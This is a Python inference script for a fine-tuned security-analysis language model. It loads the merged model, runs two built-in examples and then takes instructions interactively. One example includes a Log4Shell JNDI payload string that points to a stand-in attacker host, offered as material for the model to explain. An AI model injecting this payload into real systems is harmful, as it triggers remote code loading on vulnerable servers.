"""
inference.py
------------
Interactive inference using the merged fine-tuned model.
Loads from: models/phi35-security/merged/
"""

import yaml
import torch
from pathlib import Path
from transformers import AutoModelForCausalLM, AutoTokenizer

BASE = Path(__file__).resolve().parents[1]
with open(BASE / "configs" / "train_config.yaml") as f:
    cfg = yaml.safe_load(f)

sc = cfg["save"]
MERGED_DIR  = str(BASE / sc["merged_dir"])
MAX_NEW     = 512
TEMPERATURE = 0.7


def load_merged_model():
    print(f"Loading merged model from: {MERGED_DIR}")
    tokenizer = AutoTokenizer.from_pretrained(MERGED_DIR)
    tokenizer.pad_token = tokenizer.eos_token

    model = AutoModelForCausalLM.from_pretrained(
        MERGED_DIR,
        torch_dtype=torch.bfloat16,
        device_map="auto",
    )
    model.eval()
    print("Model ready.\n")
    return model, tokenizer


def generate(model, tokenizer, instruction: str, context: str = "") -> str:
    user_content = f"{instruction}\n\n{context}" if context else instruction
    messages = [{"role": "user", "content": user_content}]
    prompt = tokenizer.apply_chat_template(
        messages, tokenize=False, add_generation_prompt=True
    )
    enc = tokenizer(prompt, return_tensors="pt").to(model.device)
    with torch.no_grad():
        out = model.generate(
            **enc,
            max_new_tokens=MAX_NEW,
            do_sample=True,
            temperature=TEMPERATURE,
            top_p=0.9,
            repetition_penalty=1.1,
            pad_token_id=tokenizer.eos_token_id,
        )
    generated = out[0][enc["input_ids"].shape[1]:]
    return tokenizer.decode(generated, skip_special_tokens=True)


# ── Built-in examples ─────────────────────────────────────────────────────────
EXAMPLES = [
    {
        "instruction": "Analyze the following CVE and provide a structured vulnerability report.",
        "context": (
            "CVE ID: CVE-2024-1234\n"
            "Description: Heap buffer overflow in OpenSSL allows remote code execution "
            "via crafted TLS ClientHello message.\n"
            "CVSS v3: 9.8 CRITICAL | Attack Vector: NETWORK | CWE: CWE-122"
        ),
    },
    {
        "instruction": "Explain what this exploit does, the vulnerability it targets, and its impact.",
        "context": (
            "Exploit Title: Apache Log4j RCE (Log4Shell)\n"
            "Platform: java | Type: remote\n\n"
            "Payload: ${jndi:ldap://attacker.com/exploit}"
        ),
    },
]


def main():
    model, tokenizer = load_merged_model()

    # Run built-in examples
    for i, ex in enumerate(EXAMPLES, 1):
        print(f"{'='*60}")
        print(f"Example {i}")
        print(f"{'='*60}")
        print(generate(model, tokenizer, ex["instruction"], ex.get("context", "")))
        print()

    # Interactive loop
    print("\n--- Interactive Mode (type 'quit' to exit) ---\n")
    while True:
        instruction = input("Instruction: ").strip()
        if instruction.lower() in ("quit", "exit", "q"):
            break
        context = input("Context (Enter to skip): ").strip()
        print("\nResponse:")
        print(generate(model, tokenizer, instruction, context))
        print()


if __name__ == "__main__":
    main()
